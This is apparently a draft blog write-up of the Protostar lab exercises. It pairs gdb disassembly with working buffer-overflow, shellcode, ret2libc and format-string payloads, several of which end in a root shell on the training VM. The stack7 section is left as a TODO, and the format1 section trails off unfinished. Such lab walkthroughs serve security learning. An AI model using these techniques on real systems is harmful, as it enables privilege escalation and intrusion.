+++
title = "Protostar"
description = "exploit exercises - protostar"
date ="2017-05-24"
draft = true
publishdate ="2017-05-24"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "protostar"
project_url = "https://greyhat.dk/protostar"
type = "post"
+++

# stack0


```sh
(gdb) set disassembly-flavor intel 
(gdb) disassemble main 
Dump of assembler code for function main:
0x080483f4 <main+0>:	push   ebp
0x080483f5 <main+1>:	mov    ebp,esp
0x080483f7 <main+3>:	and    esp,0xfffffff0
0x080483fa <main+6>:	sub    esp,0x60
0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:	lea    eax,[esp+0x1c]
0x08048409 <main+21>:	mov    DWORD PTR [esp],eax
0x0804840c <main+24>:	call   0x804830c <gets@plt>
0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:	test   eax,eax
0x08048417 <main+35>:	je     0x8048427 <main+51>
0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:	call   0x804832c <puts@plt>
0x08048425 <main+49>:	jmp    0x8048433 <main+63>
0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:	call   0x804832c <puts@plt>
0x08048433 <main+63>:	leave  
0x08048434 <main+64>:	ret    
```

5C-1C = 64bytes

```python
python -c 'import struct; print("A"*64+struct.pack("I", 1))' > /tmp/fil
```

```sh
(gdb) break *0x08048415
(gdb) > r < /tmp/fil
(gdb) x $esp+0x5c
0xbffff7ac:	0x00000001
(gdb) c
Continuing.
you have changed the 'modified' variable
```

# stack1

```sh
(gdb) set disassembly-flavor intel 
(gdb) disassemble main 
Dump of assembler code for function main:
0x08048464 <main+0>:	push   ebp
0x08048465 <main+1>:	mov    ebp,esp
0x08048467 <main+3>:	and    esp,0xfffffff0
0x0804846a <main+6>:	sub    esp,0x60
0x0804846d <main+9>:	cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:	jne    0x8048487 <main+35>
0x08048473 <main+15>:	mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:	mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:	call   0x8048388 <errx@plt>
0x08048487 <main+35>:	mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:	add    eax,0x4
0x08048495 <main+49>:	mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:	mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:	lea    eax,[esp+0x1c]
0x0804849f <main+59>:	mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:	call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:	mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:	cmp    eax,0x61626364
0x080484b0 <main+76>:	jne    0x80484c0 <main+92>
0x080484b2 <main+78>:	mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:	call   0x8048398 <puts@plt>
0x080484be <main+90>:	jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:	mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:	mov    eax,0x80485f3
0x080484c9 <main+101>:	mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:	mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:	call   0x8048378 <printf@plt>
0x080484d5 <main+113>:	leave  
0x080484d6 <main+114>:	ret    
End of assembler dump.
```

```python
user@protostar:/opt/protostar/bin$ python -c 'import struct; print("A"*64+struct.pack("I", 0x61626364))' > /tmp/fil
```

```sh
(gdb) r $(cat /tmp/fil)
Starting program: /opt/protostar/bin/stack1 $(cat /tmp/fil)
you have correctly got the variable to the right value
```

# stack2

```sh
(gdb) set disassembly-flavor intel 
(gdb) disassemble main 
Dump of assembler code for function main:
0x08048494 <main+0>:	push   ebp
0x08048495 <main+1>:	mov    ebp,esp
0x08048497 <main+3>:	and    esp,0xfffffff0
0x0804849a <main+6>:	sub    esp,0x60
0x0804849d <main+9>:	mov    DWORD PTR [esp],0x80485e0
0x080484a4 <main+16>:	call   0x804837c <getenv@plt>
0x080484a9 <main+21>:	mov    DWORD PTR [esp+0x5c],eax
0x080484ad <main+25>:	cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <main+30>:	jne    0x80484c8 <main+52>
0x080484b4 <main+32>:	mov    DWORD PTR [esp+0x4],0x80485e8
0x080484bc <main+40>:	mov    DWORD PTR [esp],0x1
0x080484c3 <main+47>:	call   0x80483bc <errx@plt>
0x080484c8 <main+52>:	mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:	mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:	mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:	lea    eax,[esp+0x18]
0x080484dc <main+72>:	mov    DWORD PTR [esp],eax
0x080484df <main+75>:	call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:	mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:	cmp    eax,0xd0a0d0a
0x080484ed <main+89>:	jne    0x80484fd <main+105>
0x080484ef <main+91>:	mov    DWORD PTR [esp],0x8048618
0x080484f6 <main+98>:	call   0x80483cc <puts@plt>
0x080484fb <main+103>:	jmp    0x8048512 <main+126>
0x080484fd <main+105>:	mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:	mov    eax,0x8048641
0x08048506 <main+114>:	mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:	mov    DWORD PTR [esp],eax
0x0804850d <main+121>:	call   0x80483ac <printf@plt>
0x08048512 <main+126>:	leave  
0x08048513 <main+127>:	ret    
End of assembler dump.
(gdb) x 0x80485e0
0x80485e0:	0x45455247
(gdb) x/s 0x80485e0
0x80485e0:	 "GREENIE"
(gdb) x/s 0x80485e0
```

```sh
export GREENIE=$(python -c 'import struct; print("A"*64+struct.pack("I", 0x0d0a0d0a))')
user@protostar:/opt/protostar/bin$ ./stack2 
you have correctly modified the variable
```

# stack3

```sh
(gdb) set disassembly-flavor intel 
(gdb) disassemble main 
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
(gdb) info functions 
All defined functions:

File stack3/stack3.c:
int main(int, char **);
void win(void);

.................

---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) disassemble win
Dump of assembler code for function win:
0x08048424 <win+0>:	push   ebp
0x08048425 <win+1>:	mov    ebp,esp
0x08048427 <win+3>:	sub    esp,0x18
0x0804842a <win+6>:	mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:	call   0x8048360 <puts@plt>
0x08048436 <win+18>:	leave  
0x08048437 <win+19>:	ret    
End of assembler dump.
```

```sh
python -c 'import struct; print("A"*64+struct.pack("I", 0x08048424))' > /tmp/fil
cat /tmp/fil|./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

# stack4

```sh
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave  
0x0804841e <main+22>:	ret    
End of assembler dump.
(gdb) disassemble win
Dump of assembler code for function win:
0x080483f4 <win+0>:	push   ebp
0x080483f5 <win+1>:	mov    ebp,esp
0x080483f7 <win+3>:	sub    esp,0x18
0x080483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:	call   0x804832c <puts@plt>
0x08048406 <win+18>:	leave  
0x08048407 <win+19>:	ret    
End of assembler dump.
```

```sh
user@protostar:/opt/protostar/bin$ python -c 'import struct; print("A"*76+struct.pack("I", 0x080483f4))' > /tmp/fil
user@protostar:/opt/protostar/bin$ ./stack4 < /tmp/fil 
code flow successfully changed
Segmentation fault
```

# stack5


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
        }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
} 
```

```sh
(gdb) disassemble main 
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   ebp
0x080483c5 <main+1>:	mov    ebp,esp
0x080483c7 <main+3>:	and    esp,0xfffffff0
0x080483ca <main+6>:	sub    esp,0x50
0x080483cd <main+9>:	lea    eax,[esp+0x10]
0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.

```

Using shellcode that re-opens stdin (https://www.exploit-db.com/exploits/13357/)
```sh
user@protostar:/opt/protostar/bin$ export EGG=$(python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
user@protostar:/opt/protostar/bin$ /tmp/getenv EGG /opt/protostar/bin/stack5
EGG will be at 0xbffff9ca
user@protostar:/opt/protostar/bin$ python -c 'import struct; print("A"*76+struct.pack("I", 0xbffff9ca))'|/opt/protostar/bin/stack5# whoami
root
```

# stack6

```sh
(gdb) disassemble main 
Dump of assembler code for function main:
0x080484fa <main+0>:	push   ebp
0x080484fb <main+1>:	mov    ebp,esp
0x080484fd <main+3>:	and    esp,0xfffffff0
0x08048500 <main+6>:	call   0x8048484 <getpath>
0x08048505 <main+11>:	mov    esp,ebp
0x08048507 <main+13>:	pop    ebp
0x08048508 <main+14>:	ret    
End of assembler dump.
(gdb) disassemble getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68
0x0804848a <getpath+6>:	mov    eax,0x80485d0
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:	and    eax,0xbf000000
0x080484bd <getpath+57>:	cmp    eax,0xbf000000
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    eax,0x80485e4
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    eax,0x80485f0
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret    
End of assembler dump.
(gdb)  print &system
$3 = (<text variable, no debug info> *) 0xb7ecffb0 <__libc_system>
(gdb) find &system,+9999999,"/bin/sh"
0xb7fba23f
warning: Unable to access target memory at 0xb7fd9647, halting search.
1 pattern found.
(gdb)  print &exit
$4 = (<text variable, no debug info> *) 0xb7ec60c0 <*__GI_exit>
```

RET2LIBC = &system + &exit + &'/bin/sh'

without suid in order to get a core:

```sh
user@protostar:/tmp$ cp /opt/protostar/bin/stack6
user@protostar:/tmp$ python -c 'print "A"*200' > fil
user@protostar:/tmp$ ./stack6 < fil
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
user@protostar:/tmp$ gdb stack6 core.11.stack6.3892 
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /tmp/stack6...done.

warning: Can't read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
Core was generated by `./stack6'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/20x $esp - 0x5c
0xbffff794:	0x00000001	0xb7fff8f8	0x41414141	0x41414141
0xbffff7a4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7b4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7c4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7d4:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) x/x 0xbffff794+8
0xbffff79c:	0x41414141
```sh


```python
#!/usr/bin/env python

import struct

def fill(len):
	c = 0x41
	ret = ""
	for x in range(0, len):
		ret += chr(c)
		if x % 4 == 0:
			c += 1
	return ret

OFFSET = 80
SHELL = "/bin/sh;#"
SYSTEM = struct.pack("I", 0xb7ecffb0)
EXIT = struct.pack("I", 0xb7ec60c0)
BUF = struct.pack("I", 0xbffff79c)

PAYLOAD = SHELL+fill(OFFSET-len(SHELL))+SYSTEM+EXIT+BUF

print(PAYLOAD)
```

```sh
user@protostar:/tmp$ (cat fil;cat)|./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
id
Segmentation fault (core dumped)
user@protostar:/tmp$ (cat fil;cat)|./stack6
input path please: got path /bin/sh;#ABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOO����PPQQQQRRRRSS�����`췜���
id
uid=1001(user) gid=1001(user) groups=1001(user)
```

Now the stack is a little bit changed when using it on SUID so it was trial and error:

```python
#!/usr/bin/env python

import struct

def fill(len):
	c = 0x41
	ret = ""
	for x in range(0, len):
		ret += chr(c)
		if x % 4 == 0:
			c += 1
	return ret

OFFSET = 80
SHELL = "/bin/sh;#"
SYSTEM = struct.pack("I", 0xb7ecffb0)
EXIT = struct.pack("I", 0xb7ec60c0)
BUF = struct.pack("I", 0xbffff79c-48)

PAYLOAD = SHELL+fill(OFFSET-len(SHELL))+SYSTEM+EXIT+BUF

print(PAYLOAD)
```

```sh
user@protostar:/tmp$ (cat fil;cat)|/opt/protostar/bin/stack6
input path please: got path /bin/sh;#ABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOO����PPQQQQRRRRSS�����`��l���
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```


# stack7

TODO

same as stack6 but with

```python
#!/usr/bin/env python

import struct

def fill(len):
	c = 0x41
	ret = ""
	for x in range(0, len):
		ret += chr(c)
		if x % 4 == 0:
			c += 1
	return ret

OFFSET = 80
SHELL = "/bin/sh;#"
SYSTEM = struct.pack("I", 0xb7ecffb0)
EXIT = struct.pack("I", 0xb7ec60c0)
BUF = struct.pack("I", 0xbffff79c-48)
RET = struct.pack("I", INSERT GADGET HERE)

PAYLOAD = SHELL+fill(OFFSET-len(SHELL))+RET+SYSTEM+EXIT+BUF

print(PAYLOAD)
```

# format0

```sh
(gdb) disassemble main
Dump of assembler code for function main:
0x0804842b <main+0>:	push   ebp
0x0804842c <main+1>:	mov    ebp,esp
0x0804842e <main+3>:	and    esp,0xfffffff0
0x08048431 <main+6>:	sub    esp,0x10
0x08048434 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048437 <main+12>:	add    eax,0x4
0x0804843a <main+15>:	mov    eax,DWORD PTR [eax]
0x0804843c <main+17>:	mov    DWORD PTR [esp],eax
0x0804843f <main+20>:	call   0x80483f4 <vuln>
0x08048444 <main+25>:	leave  
0x08048445 <main+26>:	ret    
End of assembler dump.
(gdb) disassemble vuln 
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:	push   ebp
0x080483f5 <vuln+1>:	mov    ebp,esp
0x080483f7 <vuln+3>:	sub    esp,0x68
0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:	leave  
0x0804842a <vuln+54>:	ret    
End of assembler dump.
(gdb) r $(python -c "print '%64s\xef\xbe\xad\xde'")
Starting program: /opt/protostar/bin/format0 $(python -c "print '%64s\xef\xbe\xad\xde'")
you have hit the target correctly :)

Program exited with code 045.
```

8 bytes of input

# format1

r "$(python -c "print '\x38\x96\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+'%x '*136+'%n '")"
r "$(python -c "print '\x38\x96\x04\x08 BBBB CCCC%135\$n'")"
r "$(python -c "print '\x38\x96\x04\x08'") BBBB %32x%135\$n"
Starting program: /opt/protostar/bin/format1 "$(python -c "print '\x38\x96\x04\x08'") BBBB %32x%135\$n"


```sh
(gdb) disassemble main 
Dump of assembler code for function main:
0x0804841c <main+0>:	push   ebp
0x0804841d <main+1>:	mov    ebp,esp
0x0804841f <main+3>:	and    esp,0xfffffff0
0x08048422 <main+6>:	sub    esp,0x10
0x08048425 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048428 <main+12>:	add    eax,0x4
0x0804842b <main+15>:	mov    eax,DWORD PTR [eax]
0x0804842d <main+17>:	mov    DWORD PTR [esp],eax
0x08048430 <main+20>:	call   0x80483f4 <vuln>
0x08048435 <main+25>:	leave  
0x08048436 <main+26>:	ret    
End of assembler dump.
(gdb) disassemble vuln 
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:	push   ebp
0x080483f5 <vuln+1>:	mov    ebp,esp
0x080483f7 <vuln+3>:	sub    esp,0x18
0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
0x0804840a <vuln+22>:	test   eax,eax
0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
0x0804840e <vuln+26>:	mov    DWORD PTR [esp],0x8048500
0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret    
(gdb) r $(python -c "print '%x.'*200")
Starting program: /opt/protostar/bin/format1 $(python -c "print '%x.'*200")
804960c.bffff548.8048469.b7fd8304.b7fd7ff4.bffff548.8048435.bffff738.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff5c8.b7eadc76.2.bffff5f4.bffff600.b7fe1848.bffff5b0.ffffffff.b7ffeff4.804824d.1.bffff5b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff5c8.4f4fbe.2a1d99ae.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff5f4.8048450.8048440.b7ff1040.bffff5ec.b7fff8f8.2.bffff71d.bffff738.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff6fb.1f.bfffffe1.f.bffff70b.0.0.0.0.0.72000000.f72bbcfe.3c60ffd2.836ea53e.6933b39a.363836.0.0.0.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
Program exited normally.
(gdb) r $(python -c "print 'AAAABBBB%x.'*200")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAABBBB%x.'*200")
AAAABBBB804960c.AAAABBBBbfffef08.AAAABBBB8048469.AAAABBBBb7fd8304.AAAABBBBb7fd7ff4.AAAABBBBbfffef08.AAAABBBB8048435.AAAABBBBbffff0f8.AAAABBBBb7ff1040.AAAABBBB804845b.AAAABBBBb7fd7ff4.AAAABBBB8048450.AAAABBBB0.AAAABBBBbfffef88.AAAABBBBb7eadc76.AAAABBBB2.AAAABBBBbfffefb4.AAAABBBBbfffefc0.AAAABBBBb7fe1848.AAAABBBBbfffef70.AAAABBBBffffffff.AAAABBBBb7ffeff4.AAAABBBB804824d.AAAABBBB1.AAAABBBBbfffef70.AAAABBBBb7ff0626.AAAABBBBb7fffab0.AAAABBBBb7fe1b28.AAAABBBBb7fd7ff4.AAAABBBB0.AAAABBBB0.AAAABBBBbfffef88.AAAABBBB48951110.AAAABBBB62f34700.AAAABBBB0.AAAABBBB0.AAAABBBB0.AAAABBBB2.AAAABBBB8048340.AAAABBBB0.AAAABBBBb7ff6210.AAAABBBBb7eadb9b.AAAABBBBb7ffeff4.AAAABBBB2.AAAABBBB8048340.AAAABBBB0.AAAABBBB8048361.AAAABBBB804841c.AAAABBBB2.AAAABBBBbfffefb4.AAAABBBB8048450.AAAABBBB8048440.AAAABBBBb7ff1040.AAAABBBBbfffefac.AAAABBBBb7fff8f8.AAAABBBB2.AAAABBBBbffff0dd.AAAABBBBbffff0f8.AAAABBBB0.AAAABBBBbffff991.AAAABBBBbffff99b.AAAABBBBbffff9b8.AAAABBBBbffff9cc.AAAABBBBbffff9d4.AAAABBBBbffff9ea.AAAABBBBbffff9fa.AAAABBBBbffffa0d.AAAABBBBbffffa1a.AAAABBBBbffffa29.AAAABBBBbffffa35.AAAABBBBbffffa49.AAAABBBBbffffa87.AAAABBBBbffffa98.AAAABBBBbfffff88.AAAABBBBbfffff96.AAAABBBBbfffffad.AAAABBBBbfffffd8.AAAABBBB0.AAAABBBB20.AAAABBBBb7fe2414.AAAABBBB21.AAAABBBBb7fe2000.AAAABBBB10.AAAABBBB78bfbfd.AAAABBBB6.AAAABBBB1000.AAAABBBB11.AAAABBBB64.AAAABBBB3.AAAABBBB8048034.AAAABBBB4.AAAABBBB20.AAAABBBB5.AAAABBBB7.AAAABBBB7.AAAABBBBb7fe3000.AAAABBBB8.AAAABBBB0.AAAABBBB9.AAAABBBB8048340.AAAABBBBb.AAAABBBB3e9.AAAABBBBc.AAAABBBB3e9.AAAABBBBd.AAAABBBB3e9.AAAABBBBe.AAAABBBB3e9.AAAABBBB17.AAAABBBB1.AAAABBBB19.AAAABBBBbffff0bb.AAAABBBB1f.AAAABBBBbfffffe1.AAAABBBBf.AAAABBBBbffff0cb.AAAABBBB0.AAAABBBB0.AAAABBBB0.AAAABBBB0.AAAABBBB0.AAAABBBB5c000000.AAAABBBB980c6fad.AAAABBBB4e37dba5.AAAABBBBdd48dc7f.AAAABBBB69ab0c09.AAAABBBB363836.AAAABBBB0.AAAABBBB0.AAAABBBB0.AAAABBBB706f2f00.AAAABBBB72702f74.AAAABBBB736f746f.AAAABBBB2f726174.AAAABBBB2f6e6962.AAAABBBB6d726f66.AAAABBBB317461.AAAABBBB41414141.AAAABBBB42424242.AAAABBBB412e7825.AAAABBBB42414141.AAAABBBB25424242.AAAABBBB41412e78.AAAABBBB42424141.AAAABBBB78254242.AAAABBBB4141412e.AAAABBBB42424241.AAAABBBB2e782542.AAAABBBB41414141.AAAABBBB42424242.AAAABBBB412e7825.AAAABBBB42414141.AAAABBBB25424242.AAAABBBB41412e78.AAAABBBB42424141.AAAABBBB78254242.AAAABBBB4141412e.AAAABBBB42424241.AAAABBBB2e782542.AAAABBBB41414141.AAAABBBB42424242.AAAABBBB412e7825.AAAABBBB42414141.AAAABBBB25424242.AAAABBBB41412e78.AAAABBBB42424141.AAAABBBB78254242.AAAABBBB4141412e.AAAABBBB42424241.AAAABBBB2e782542.AAAABBBB41414141.AAAABBBB42424242.AAAABBBB412e7825.AAAABBBB42414141.AAAABBBB25424242.AAAABBBB41412e78.AAAABBBB42424141.AAAABBBB78254242.AAAABBBB4141412e.AAAABBBB42424241.AAAABBBB2e782542.AAAABBBB41414141.AAAABBBB42424242.AAAABBBB412e7825.AAAABBBB42414141.AAAABBBB25424242.AAAABBBB41412e78.AAAABBBB42424141.AAAABBBB78254242.AAAABBBB4141412e.AAAABBBB42424241.AAAABBBB2e782542.AAAABBBB41414141.AAAABBBB42424242.AAAABBBB412e7825.AAAABBBB42414141.AAAABBBB25424242.AAAABBBB41412e78.AAAABBBB42424141.AAAABBBB78254242.
Program exited normally.
(gdb) r $(python -c "print '%x.'*200")
Starting program: /opt/protostar/bin/format1 $(python -c "print '%x.'*200")
